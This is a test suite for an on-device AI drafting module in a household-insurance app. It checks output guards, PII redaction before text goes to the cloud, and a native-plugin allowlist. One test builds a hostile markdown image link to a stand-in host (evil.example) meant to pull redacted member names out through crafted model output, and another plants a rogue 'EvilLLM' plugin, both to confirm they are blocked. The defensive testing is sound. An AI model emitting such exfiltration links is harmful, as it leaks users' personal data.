import { describe, it, expect, afterEach, vi } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  isOnDeviceSupported,
  isOnDeviceEnabled,
  setOnDeviceEnabled,
  detectOnDeviceProvider,
  verifyOnDeviceOutput,
  buildDeterministicStepDraft,
  redactForCloudEgress,
  generateDraftOnDevice,
  generateDraftOnDeviceDetailed,
  containsSpecialCategoryContent,
} from '../onDeviceLlm'

const SOURCE_PATH = join(process.cwd(), 'src/lib/onDeviceLlm.ts')

afterEach(() => {
  localStorage.clear()
  delete (globalThis.navigator as any).gpu
  delete (globalThis as any).Capacitor
  delete (globalThis as any).LanguageModel
  delete (globalThis as any).ai
})

describe('PRD-113: isOnDeviceSupported & multi-provider detection', () => {
  it('is false when no native, built-in, or WebGPU provider is present', () => {
    expect(detectOnDeviceProvider()).toBe('unavailable')
    expect(isOnDeviceSupported()).toBe(false)
  })

  it('detects WebLLM when navigator.gpu is present', () => {
    Object.defineProperty(navigator, 'gpu', { value: {}, configurable: true })
    expect(detectOnDeviceProvider()).toBe('webllm')
    expect(isOnDeviceSupported()).toBe(true)
  })

  it('prefers browser_builtin (Chrome/Edge Prompt API) over WebGPU download', () => {
    Object.defineProperty(navigator, 'gpu', { value: {}, configurable: true })
    ;(globalThis as any).LanguageModel = { create: async () => ({}) }
    expect(detectOnDeviceProvider()).toBe('browser_builtin')
    expect(isOnDeviceSupported()).toBe(true)
  })

  it('prefers capacitor_native (Apple Foundation Models / Android AICore) over all browser tiers', () => {
    Object.defineProperty(navigator, 'gpu', { value: {}, configurable: true })
    ;(globalThis as any).LanguageModel = { create: async () => ({}) }
    ;(globalThis as any).Capacitor = {
      Plugins: {
        LocalLLM: { prompt: async () => ({ text: '' }) },
      },
    }
    expect(detectOnDeviceProvider()).toBe('capacitor_native')
    expect(isOnDeviceSupported()).toBe(true)
  })
})

describe('PRD-113: on-device preference persistence', () => {
  it('defaults to disabled', () => {
    expect(isOnDeviceEnabled()).toBe(false)
  })

  it('round-trips through setOnDeviceEnabled', () => {
    setOnDeviceEnabled(true)
    expect(isOnDeviceEnabled()).toBe(true)
    setOnDeviceEnabled(false)
    expect(isOnDeviceEnabled()).toBe(false)
  })
})

describe("guardrail: PRD-113's on-device system prompt never names a product/provider — CLAUDE.md's second rule, mechanically enforced", () => {
  it('forbids recommending/switching/comparing, same class of language PRD-111 guards against', () => {
    const source = readFileSync(SOURCE_PATH, 'utf-8')
    // Check SYSTEM_PROMPT specifically — the guard table legitimately lists
    // banned phrases so verifyOnDeviceOutput can reject them at runtime.
    const promptStart = source.indexOf('const SYSTEM_PROMPT =')
    const promptEnd = source.indexOf('const DRAFT_JSON_SCHEMA =')
    const promptSlice = source.slice(promptStart, promptEnd)
    const forbidden =
      /lost your job|you'?ve been made redundant|best policy|recommended policy|we recommend/i
    expect(promptSlice).not.toMatch(forbidden)
    // Positive check — the constraint must actually be *stated*, not just absent.
    expect(promptSlice).toMatch(/never recommend, compare, or name a specific product or provider/i)
  })
})

describe('Device-First AI: verifyOnDeviceOutput (isomorphic client guard)', () => {
  const sourceStep =
    'Notify insurer regarding policy #99201 with £200,000 life cover within 30 days.'

  it('accepts a compliant, grounded draft', () => {
    const draft =
      'Hello,\n\nI am writing to follow up on policy #99201 (£200,000 cover) within the 30 day window.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(true)
    expect(res.text).toBe(draft)
  })

  it('rejects hallucinated / ungrounded numbers not present in source context', () => {
    const draft =
      'Hello,\n\nI am writing regarding policy #99201 with £350,000 cover to confirm next steps.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('ungrounded_numeral:350000')
  })

  it('rejects magnitude-suffixed figures the source does not contain verbatim', () => {
    // Source has £200 — output claiming "£200k" is a NEW figure, not a copy.
    const draft =
      'Hello,\n\nFollowing up on the £200k cover for policy #99201 mentioned in our records.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, 'Notify insurer about policy #99201 with £200 cover.')
    expect(res.accepted).toBe(false)
    expect(res.reason).toMatch(/^ungrounded_magnitude/)
  })

  it('rejects spelled-out magnitudes absent from the source', () => {
    const draft =
      'Hello,\n\nI am writing about the two hundred thousand pound cover on our household policy.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, 'Notify insurer about policy #99201.')
    expect(res.accepted).toBe(false)
    expect(res.reason).toMatch(/^ungrounded_number_word/)
  })

  it('rejects regulated advice or switching language (CLAUDE.md Rule 2)', () => {
    const draft =
      'Hello,\n\nWe recommend that you switch to a better policy with lower premiums.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('personal_recommendation')
  })

  it('rejects switching language WITHOUT a recommendation prefix', () => {
    const draft =
      'Hello,\n\nYou may want to switch to a cheaper provider for better value going forward.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(false)
  })

  it('permits the CLAUDE.md-sanctioned "compare quotes from multiple insurers" phrasing', () => {
    const draft =
      'Hello,\n\nPlease confirm our cover status. We will compare quotes from multiple insurers ourselves.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(true)
  })

  it('rejects a SECOND ungrounded provider even when the first is grounded', () => {
    // Review finding: first-match `continue` whitelisted every later provider.
    const referencedSource = 'Contact Aviva regarding policy #99201 within 30 days.'
    const draft =
      'Hello,\n\nPlease contact Aviva or Zurich about policy #99201 for our household.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, referencedSource)
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('named_provider')
  })

  it('does not whitelist AXA via the substring inside "taxable"', () => {
    const draft =
      'Hello,\n\nAXA offer this cover — please contact them about our household records now.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, 'Check the taxable income records for our household.')
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('named_provider')
  })

  it('rejects unreferenced named providers while allowing a provider already in the source step', () => {
    const unreferenced =
      'Hello,\n\nPlease contact Aviva regarding policy #99201 for your household.\n\nThank you,'
    expect(verifyOnDeviceOutput(unreferenced, sourceStep).accepted).toBe(false)
    expect(verifyOnDeviceOutput(unreferenced, sourceStep).reason).toBe('named_provider')

    const referencedSource = 'Contact Aviva regarding policy #99201 within 30 days.'
    expect(verifyOnDeviceOutput(unreferenced, referencedSource).accepted).toBe(true)
  })

  it('rejects drafts that falsely claim an action was already sent or submitted (CLAUDE.md Rule 1)', () => {
    const draft =
      'Hello,\n\nWe have sent your claim form for policy #99201 and scheduled for you.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('autonomous_action_claim')
  })

  it('rejects secret/API-key leakage', () => {
    const draft =
      'Hello,\n\nUse key sk-abcdef1234567890 to access the account for policy #99201.\n\nThank you,'
    const res = verifyOnDeviceOutput(draft, sourceStep)
    expect(res.accepted).toBe(false)
    expect(res.reason).toBe('secret_leak')
  })

  it('enforces the 20..1200 character bounds', () => {
    expect(verifyOnDeviceOutput('too short', sourceStep).reason).toBe('too_short')
    expect(verifyOnDeviceOutput('x'.repeat(1300), sourceStep).reason).toBe('too_long')
  })
})

describe('Device-First AI: buildDeterministicStepDraft & end-to-end guarded generation', () => {
  it('produces a compliant offline fallback draft that passes verifyOnDeviceOutput', () => {
    const step = 'Request confirmation of life cover beneficiary details for policy 4410.'
    const draft = buildDeterministicStepDraft(step)
    const check = verifyOnDeviceOutput(draft, step)
    expect(check.accepted).toBe(true)
  })

  it('clips over-long step bodies so the template stays under the guard limit', () => {
    const step = 'x'.repeat(1500)
    const draft = buildDeterministicStepDraft(step)
    expect(draft.length).toBeLessThan(1200)
  })

  it('handles empty input without producing a degenerate draft', () => {
    const draft = buildDeterministicStepDraft('   ')
    expect(draft).not.toContain('in relation to: .')
    expect(draft).toContain('household records')
  })

  it('generateDraftOnDevice unwraps JSON-constrained output and enforces client guards', async () => {
    const promptCalls: Array<{ input: string; options?: unknown }> = []
    const createCalls: unknown[] = []
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'available',
      create: async (opts: unknown) => {
        createCalls.push(opts)
        return {
          prompt: async (input: string, options?: unknown) => {
            promptCalls.push({ input, options })
            return JSON.stringify({
              body: 'Hello,\n\nI am writing to check the status of policy 4410 on file.\n\nThank you,',
            })
          },
          destroy: () => {},
        }
      },
    }
    const ok = await generateDraftOnDevice('Check status of policy 4410.')
    expect(ok).toBe(
      'Hello,\n\nI am writing to check the status of policy 4410 on file.\n\nThank you,',
    )
    expect(ok).not.toContain('{')
    // The system prompt must travel via initialPrompts (shipped API), not
    // the deprecated systemPrompt option which WebIDL silently drops.
    expect(createCalls[0]).toMatchObject({
      initialPrompts: [{ role: 'system', content: expect.stringContaining('DRAFT ONLY') }],
    })
    expect(promptCalls[0]?.options).toMatchObject({
      responseConstraint: expect.objectContaining({ type: 'object' }),
    })
  })

  it('generateDraftOnDevice returns null for a model reporting downloadable', async () => {
    let createCalled = false
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'downloadable',
      create: async () => {
        createCalled = true
        return {}
      },
    }
    expect(await generateDraftOnDevice('Check status of policy 4410.')).toBeNull()
    expect(createCalled).toBe(false)
  })

  it('generateDraftOnDevice returns null (not raw JSON) on truncated structured output', async () => {
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'available',
      create: async () => ({
        prompt: async () => '{"body":"Hello, I am writing to check pol',
        destroy: () => {},
      }),
    }
    expect(await generateDraftOnDevice('Check status of policy 4410.')).toBeNull()
  })

  it('generateDraftOnDevice returns null for empty/whitespace input without touching a runtime', async () => {
    let createCalled = false
    ;(globalThis as any).LanguageModel = {
      create: async () => {
        createCalled = true
        return {}
      },
    }
    expect(await generateDraftOnDevice('   ')).toBeNull()
    expect(createCalled).toBe(false)
  })

  it('rejects hallucinated figures through the full generation path', async () => {
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'available',
      create: async () => ({
        prompt: async () =>
          JSON.stringify({
            body: 'Hello,\n\nI am writing to claim £999,999 on policy 4410.\n\nThank you,',
          }),
        destroy: () => {},
      }),
    }
    expect(await generateDraftOnDevice('Check status of policy 4410.')).toBeNull()
  })
})

describe('Device-First AI: generateDraftOnDeviceDetailed outcome reporting', () => {
  it('reports generated with the accepted draft', async () => {
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'available',
      create: async () => ({
        prompt: async () =>
          JSON.stringify({
            body: 'Hello,\n\nChecking on policy 4410 status, please advise.\n\nThank you,',
          }),
        destroy: () => {},
      }),
    }
    const r = await generateDraftOnDeviceDetailed('Check status of policy 4410.')
    expect(r.outcome).toBe('generated')
    expect(r.draft).toContain('policy 4410')
  })

  it('reports guard_rejected with a reason', async () => {
    ;(globalThis as any).LanguageModel = {
      availability: async () => 'available',
      create: async () => ({
        prompt: async () =>
          JSON.stringify({
            body: 'Hello,\n\nWe recommend you buy better cover right away.\n\nThanks,',
          }),
        destroy: () => {},
      }),
    }
    const r = await generateDraftOnDeviceDetailed('Check status of policy 4410.')
    expect(r.outcome).toBe('guard_rejected')
    expect(r.draft).toBeNull()
    expect(r.reason).toBeDefined()
  })

  it('reports unavailable when no provider exists', async () => {
    const r = await generateDraftOnDeviceDetailed('Check status of policy 4410.')
    expect(r.outcome).toBe('unavailable')
    expect(r.draft).toBeNull()
  })

  it('reports unavailable for empty input without touching a runtime', async () => {
    const r = await generateDraftOnDeviceDetailed('   ')
    expect(r.outcome).toBe('unavailable')
    expect(r.reason).toBe('empty_input')
  })
})

describe('Device-First AI: native plugin allowlist', () => {
  it('ignores an unvetted plugin at a non-allowlisted key even if it exposes prompt()', async () => {
    ;(globalThis as any).Capacitor = {
      Plugins: {
        EvilLLM: { prompt: async () => ({ text: 'pwned' }) },
      },
    }
    // Not detected as capacitor_native — EvilLLM isn't in the allowlist.
    expect(detectOnDeviceProvider()).toBe('unavailable')
  })

  it('detects allowlisted keys only when they expose prompt()', () => {
    ;(globalThis as any).Capacitor = { Plugins: { LocalLLM: {} } }
    expect(detectOnDeviceProvider()).not.toBe('capacitor_native')
    ;(globalThis as any).Capacitor = {
      Plugins: { LocalLLM: { prompt: async () => ({}) } },
    }
    expect(detectOnDeviceProvider()).toBe('capacitor_native')
  })
})

// Fake CapgoLLM matching @capgo/capacitor-llm's session+events API.
function fakeCapgoLLM(opts: { readiness?: string; chunks?: string[]; error?: string }) {
  const listeners = new Map<string, Array<(e: unknown) => void>>()
  const on = (name: string, fn: (e: unknown) => void) => {
    listeners.set(name, [...(listeners.get(name) ?? []), fn])
    return Promise.resolve({ remove: async () => undefined })
  }
  return {
    getReadiness: async () => ({ readiness: opts.readiness ?? 'ready' }),
    createChat: async () => ({ id: 'chat-1' }),
    addListener: on,
    sendMessage: async ({ chatId }: { chatId: string }) => {
      if (opts.error) {
        for (const fn of listeners.get('generationError') ?? []) {
          fn({ chatId, error: opts.error })
        }
        return
      }
      for (const chunk of opts.chunks ?? []) {
        for (const fn of listeners.get('textFromAi') ?? []) {
          fn({ chatId, text: chunk, isChunk: true })
        }
      }
      for (const fn of listeners.get('aiFinished') ?? []) fn({ chatId })
    },
  }
}

describe('Device-First AI: Capgo session adapter (@capgo/capacitor-llm)', () => {
  it('detects CapgoLLM via its createChat/sendMessage API', () => {
    ;(globalThis as any).Capacitor = { Plugins: { CapgoLLM: fakeCapgoLLM({}) } }
    expect(detectOnDeviceProvider()).toBe('capacitor_native')
  })

  it('generates a draft by collecting textFromAi chunks until aiFinished', async () => {
    ;(globalThis as any).Capacitor = {
      Plugins: {
        CapgoLLM: fakeCapgoLLM({
          chunks: ['Dear team, please ', 'confirm our cover remains in place. Thank you,'],
        }),
      },
    }
    setOnDeviceEnabled(true)
    const draft = await generateDraftOnDevice('Contact home insurer to confirm cover')
    expect(draft).toBe('Dear team, please confirm our cover remains in place. Thank you,')
    setOnDeviceEnabled(false)
  })

  it('returns null when the model is not ready instead of triggering a download', async () => {
    ;(globalThis as any).Capacitor = {
      Plugins: { CapgoLLM: fakeCapgoLLM({ readiness: 'downloadable' }) },
    }
    setOnDeviceEnabled(true)
    expect(await generateDraftOnDevice('Contact insurer')).toBeNull()
    setOnDeviceEnabled(false)
  })

  it('returns null on a generationError event', async () => {
    ;(globalThis as any).Capacitor = {
      Plugins: { CapgoLLM: fakeCapgoLLM({ error: 'model crashed' }) },
    }
    setOnDeviceEnabled(true)
    expect(await generateDraftOnDevice('Contact insurer')).toBeNull()
    setOnDeviceEnabled(false)
  })

  it('prefer LocalLLM one-shot prompt over CapgoLLM when both are present', () => {
    ;(globalThis as any).Capacitor = {
      Plugins: {
        CapgoLLM: fakeCapgoLLM({}),
        LocalLLM: { prompt: async () => ({ text: 'x' }) },
      },
    }
    expect(detectOnDeviceProvider()).toBe('capacitor_native')
  })
})

describe('Device-First AI: Layer-B contextual recognizers', () => {
  it('redacts titled and relationship-anchored third-party names', () => {
    const curtain = redactForCloudEgress(
      'My solicitor Dr Amari Patel handled it, and my brother Kevin witnessed it.',
    )
    expect(curtain.redactedText).not.toContain('Amari')
    expect(curtain.redactedText).not.toContain('Kevin')
    expect(curtain.redactedText).toContain('Dr [PERSON_')
    expect(curtain.redactedText).toContain('brother [PERSON_')
    expect(curtain.restore('Signed by [PERSON_1_' + extractNonce(curtain) + ']')).toContain('Amari')
  })

  it('redacts street addresses, DoB in prose, and employer names', () => {
    const curtain = redactForCloudEgress(
      'Mum was born 12 March 1958, lives at 14 Chestnut Grove, and works for Tarmac Group.',
    )
    expect(curtain.redactedText).toContain('born [DOB_1_')
    expect(curtain.redactedText).not.toContain('14 Chestnut Grove')
    expect(curtain.redactedText).toContain('works for [ORG_')
  })

  it('does not mangle ordinary prose — anchors are required', () => {
    const curtain = redactForCloudEgress(
      'The High Street was busy. Dr Foster went to Gloucester is an old rhyme.',
    )
    // "High Street" without a house number stays; "Dr Foster" is titled so
    // it is still caught — that's intentional (third-party name leak).
    expect(curtain.redactedText).toContain('High Street')
    expect(curtain.redactedText).toContain('Dr [PERSON_')
  })

  it('keeps member names in the dictionary taking precedence over Layer-B', () => {
    const curtain = redactForCloudEgress('My mum Sarah Jenkins phoned.', {
      memberNames: ['Sarah Jenkins'],
    })
    expect(curtain.redactedText).toContain('[MEMBER_')
    expect(curtain.redactedText).not.toContain('[PERSON_')
  })
})

function extractNonce(curtain: { redactedText: string }): string {
  return curtain.redactedText.match(/_([a-z0-9]{6})\]/)?.[1] ?? ''
}

describe('Device-First AI: special-category screen', () => {
  it('flags free-text medical hints the regex curtain cannot remove', () => {
    expect(containsSpecialCategoryContent('mum was at the hospital for chemotherapy')).toBe(true)
    expect(containsSpecialCategoryContent('check the policy renewal date')).toBe(false)
    const curtain = redactForCloudEgress('Dad is in hospital after surgery on Tuesday.')
    expect(curtain.hasSpecialCategoryHint).toBe(true)
  })
})

describe('Device-First AI: redactForCloudEgress ("Curtain Protocol" reversible PII redaction)', () => {
  it('masks Family Twin names, policy IDs, emails, phones, and UK postcodes, then restores them locally', () => {
    const raw =
      'Does Sarah Jenkins hold policy POL-88412 at SW1A 1AA? Email sarah.jenkins@example.co.uk or call +44 7700 900123.'
    const curtain = redactForCloudEgress(raw, {
      memberNames: ['Sarah Jenkins'],
      policyNumbers: ['POL-88412'],
    })

    expect(curtain.redactedText).not.toContain('Sarah Jenkins')
    expect(curtain.redactedText).not.toContain('POL-88412')
    expect(curtain.redactedText).not.toContain('SW1A 1AA')
    expect(curtain.redactedText).not.toContain('sarah.jenkins@example.co.uk')
    expect(curtain.redactedText).not.toContain('7700 900123')
    expect(curtain.redactedText).toMatch(/\[MEMBER_1_[a-z0-9]+\]/)
    expect(curtain.redactedText).toMatch(/\[POLICY_1_[a-z0-9]+\]/)
    expect(curtain.redactedText).toMatch(/\[POSTCODE_1_[a-z0-9]+\]/)
    expect(curtain.redactedText).toMatch(/\[EMAIL_1_[a-z0-9]+\]/)
    expect(curtain.redactedText).toMatch(/\[PHONE_1_[a-z0-9]+\]/)

    const memberToken = curtain.redactedText.match(/\[MEMBER_1_[a-z0-9]+\]/)![0]
    const simulatedCloudReply = `Based on your records, ${memberToken} holds the policy.`
    expect(curtain.restore(simulatedCloudReply)).toBe(
      'Based on your records, Sarah Jenkins holds the policy.',
    )
  })

  it('redacts common UK phone formats the earlier regex missed', () => {
    for (const phone of ['07700 900123', '07700900123', '+44 (0)20 7946 0958']) {
      const curtain = redactForCloudEgress(`Call us on ${phone} tomorrow.`)
      expect(curtain.redactedText).not.toContain(phone)
      expect(curtain.redactedText).toMatch(/\[PHONE_\d+_[a-z0-9]+\]/)
    }
  })

  it('redacts Luhn-valid cards, sort codes, NI numbers, NHS numbers, and IBANs', () => {
    const curtain = redactForCloudEgress(
      'Card 4111 1111 1111 1111, sort 12-34-56, NI AB 12 34 56 C, NHS 943 476 5919, IBAN GB29 NWBK 6016 1331 9268 19.',
    )
    expect(curtain.redactedText).not.toContain('4111 1111 1111 1111')
    expect(curtain.redactedText).not.toContain('12-34-56')
    expect(curtain.redactedText).not.toContain('AB 12 34 56 C')
    expect(curtain.redactedText).not.toContain('943 476 5919')
    expect(curtain.redactedText).not.toContain('GB29 NWBK')
    // A non-Luhn 16-digit run must NOT be redacted as a card.
    const nonCard = redactForCloudEgress('Reference 4111 1111 1111 1112 on file.')
    expect(nonCard.redactedText).toContain('4111 1111 1111 1112')
  })

  it('never restores a card — returns last-4 only', () => {
    const curtain = redactForCloudEgress('Card on file: 4111 1111 1111 1111.')
    const cardToken = curtain.redactedText.match(/\[CARD_1_[a-z0-9]+\]/)!
    const restored = curtain.restore(`Your card ${cardToken[0]} is on file.`)
    expect(restored).toContain('•••• 1111')
    expect(restored).not.toContain('4111 1111 1111 1111')
  })

  it('does not restore placeholders inside URLs — blocks exfil via crafted cloud output', () => {
    const curtain = redactForCloudEgress('Member: Sarah Jenkins.', {
      memberNames: ['Sarah Jenkins'],
    })
    const memberToken = curtain.redactedText.match(/\[MEMBER_\d+_[a-z0-9]+\]/)![0]
    const hostile = `Click here: ![x](https://evil.example/?q=${memberToken})`
    const restored = curtain.restore(hostile)
    expect(restored).not.toContain('Sarah Jenkins')
    expect(restored).toContain(memberToken)
  })

  it('placeholder variants invented by the cloud are left unrestored', () => {
    const curtain = redactForCloudEgress('Member: Sarah Jenkins.', {
      memberNames: ['Sarah Jenkins'],
    })
    expect(curtain.restore('Hello [MEMBER_1] and [member_1]')).not.toContain('Sarah Jenkins')
  })
})
